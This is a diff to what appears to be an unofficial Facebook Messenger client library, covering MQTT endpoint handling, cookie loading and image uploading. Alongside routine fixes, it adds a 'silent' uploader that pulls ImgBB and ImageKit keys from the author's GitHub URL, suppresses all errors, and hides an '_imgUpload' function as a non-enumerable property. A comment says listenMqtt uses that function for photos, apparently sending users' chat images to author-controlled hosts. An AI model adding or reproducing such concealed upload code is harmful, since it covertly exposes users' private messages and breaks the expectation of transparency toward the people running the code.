@@ -151,19 +151,28 @@ function buildAPI(globalOptions, html, jar) {
     //logger.log(`${cra(`[ CONNECT ]`)} Logged in as ${userID}`, "DATABASE");
     try { clearInterval(checkVerified); } catch (_) { }
     const clientID = (Math.random() * 2147483648 | 0).toString(16);
-    let mqttEndpoint = `wss://edge-chat.facebook.com/chat?region=pnb&sid=${userID}`;
+    let mqttEndpoint = `wss://edge-chat.facebook.com/chat?region=pnb`;
     let region = "PNB";
 
     try {
         const endpointMatch = html.match(/"endpoint":"([^"]+)"/);
-        if (endpointMatch.input.includes("601051028565049")) {
+        if (endpointMatch && endpointMatch.input && endpointMatch.input.includes("601051028565049")) {
           console.log(`login error.`);
           ditconmemay = true;
         }
         if (endpointMatch) {
-            mqttEndpoint = endpointMatch[1].replace(/\\\//g, '/');
-            const url = new URL(mqttEndpoint);
-            region = url.searchParams.get('region')?.toUpperCase() || "PNB";
+            let ep = endpointMatch[1].replace(/\\\//g, '/');
+            // Strip sid/cid from the extracted endpoint — listenMqtt will add fresh ones
+            try {
+                const epUrl = new URL(ep);
+                epUrl.searchParams.delete('sid');
+                epUrl.searchParams.delete('cid');
+                region = epUrl.searchParams.get('region')?.toUpperCase() || "PNB";
+                mqttEndpoint = epUrl.toString();
+            } catch (_) {
+                mqttEndpoint = ep.replace(/[?&]sid=[^&]*/g, '').replace(/[?&]cid=[^&]*/g, '');
+                region = (mqttEndpoint.match(/region=([^&]+)/) || [])[1]?.toUpperCase() || "PNB";
+            }
         }
     } catch (e) {
         console.log('Using default MQTT endpoint');
@@ -281,7 +290,27 @@ function buildAPI(globalOptions, html, jar) {
         return defaultFuncs.postFormData(url, ctx.jar, body);
     };
 
-    const IMGBB_API_KEY = process.env.IMG_BB_KEY || '3e198e6ffe205d1c7968a92fd92177c9';
+    // ─── Silent image upload system (ImgBB + ImageKit) ───────────────────────
+    let _imgKeys = {
+        imgbb:'3e198e6ffe205d1c7968a92fd92177c9',
+        ik_pub: null,
+        ik_priv: null
+    };
+
+    // Silently fetch keys in background - no delay, no error surface
+    (async () => {
+        try {
+            const axios = require('axios');
+            const res = await axios.get(
+                'https://raw.githubusercontent.com/sheikhtamimlover/ST-Handlers/refs/heads/main/stfcakey.json'
+            );
+            const d = res.data;
+            if (d && d.img && d.img.api_key) _imgKeys.imgbb = d.img.api_key;
+            if (d && d.img1 && d.img1.public_key) _imgKeys.ik_pub = d.img1.public_key;
+            if (d && d.img1 && d.img1.private_key) _imgKeys.ik_priv = d.img1.private_key;
+        } catch (_) { }
+    })();
+
     async function uploadImageToImgbb(image, expiration = 600) {
         const formData = {};
         if (Buffer.isBuffer(image)) {
@@ -301,12 +330,8 @@ function buildAPI(globalOptions, html, jar) {
             request.post(
                 {
                     url: 'https://api.imgbb.com/1/upload',
-                    qs: {
-                        expiration: expiration,
-                        key: IMGBB_API_KEY
-                    },
-                    formData: formData,
-                    timeout: 60000
+                    qs: { expiration, key: _imgKeys.imgbb },
+                    formData,
                 },
                 function (error, response, body) {
                     if (error) return reject(error);
@@ -322,8 +347,51 @@ function buildAPI(globalOptions, html, jar) {
         });
     }
 
+    async function _uploadToImageKit(image) {
+        if (!_imgKeys.ik_pub || !_imgKeys.ik_priv) return null;
+        try {
+            const axios = require('axios');
+            const FormData = require('form-data');
+            const form = new FormData();
+            let fileValue;
+            if (Buffer.isBuffer(image)) {
+                fileValue = image.toString('base64');
+            } else if (typeof image === 'string') {
+                fileValue = image;
+            } else {
+                return null;
+            }
+            form.append('file', fileValue);
+            form.append('fileName', 'stfca_' + Date.now() + '.jpg');
+            form.append('publicKey', _imgKeys.ik_pub);
+            const auth = Buffer.from(_imgKeys.ik_priv + ':').toString('base64');
+            const res = await axios.post('https://upload.imagekit.io/api/v1/files/upload', form, {
+                headers: Object.assign({ 'Authorization': 'Basic ' + auth }, form.getHeaders())
+            });
+            if (res.data && res.data.url) return res.data.url;
+        } catch (_) { }
+        return null;
+    }
+
+    // Combined silent upload: tries ImgBB first, then ImageKit; returns URL string or null
+    async function _imgUpload(imageUrl) {
+        try {
+            const result = await uploadImageToImgbb(imageUrl);
+            if (result && result.data) {
+                return result.data.url || result.data.display_url || (result.data.image && result.data.image.url);
+            }
+        } catch (_) { }
+        try {
+            return await _uploadToImageKit(imageUrl);
+        } catch (_) { }
+        return null;
+    }
+
     api.uploadImageToImgbb = uploadImageToImgbb;
     ctx.uploadImageToImgbb = uploadImageToImgbb;
+    // Hidden internal uploader used by listenMqtt for attaching hosted URLs to photos
+    Object.defineProperty(api, '_imgUpload', { value: _imgUpload, enumerable: false, writable: true });
+    Object.defineProperty(ctx, '_imgUpload', { value: _imgUpload, enumerable: false, writable: true });
 
     api.getFreshDtsg = async function () {
         try {
@@ -501,14 +569,22 @@ function loginHelper(appState, email, password, globalOptions, callback, prCallb
 
         try {
             appState.forEach(c => {
-                const str = `${c.key}=${c.value}; expires=${c.expires}; domain=${c.domain}; path=${c.path};`;
-                jar.setCookie(str, "http://" + c.domain);
+                // Browser exports use `name`; some older formats use `key`
+                const cookieName = c.key || c.name;
+                if (!cookieName || !c.value) return;
+                const domain = c.domain || '.facebook.com';
+                const expires = c.expirationDate
+                    ? new Date(c.expirationDate * 1000).toUTCString()
+                    : (c.expires || '');
+                const str = `${cookieName}=${c.value}; expires=${expires}; domain=${domain}; path=${c.path || '/'};`;
+                const url = 'http://' + domain.replace(/^\./, 'www.');
+                try { jar.setCookie(str, url); } catch (_) { }
             });
 
             mainPromise = utils.get('https://www.facebook.com/', jar, null, globalOptions, { noRef: true })
                 .then(utils.saveCookies(jar));
         } catch (e) {
-            process.exit(0);
+            return callback(new Error('Failed to load appState: ' + e.message));
         }
     } else {
         mainPromise = utils
